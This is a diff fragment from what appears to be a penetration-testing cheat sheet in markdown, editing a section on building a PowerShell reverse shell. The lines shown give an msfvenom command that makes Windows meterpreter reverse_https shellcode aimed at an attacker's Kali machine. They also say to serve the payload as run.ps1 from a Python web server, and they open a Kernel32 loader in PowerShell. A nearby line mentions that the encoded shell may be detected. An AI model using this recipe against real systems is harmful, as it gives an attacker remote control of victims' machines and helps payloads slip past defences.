@@ -50,7 +50,7 @@ However, this version (above) contains encoded meterpreter shell so might get de
 ### .ps1 reverse shell
 <details>
 1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
-2. Save this file as `run.ps1` in the root folder of where u host your python http server
+2. Save this file as `run.ps1` in the root folder of where u host your python http server (or use [Reflective Powershell](#reflective-powershell))
 ```
 $Kernel32 = @"
 using System;
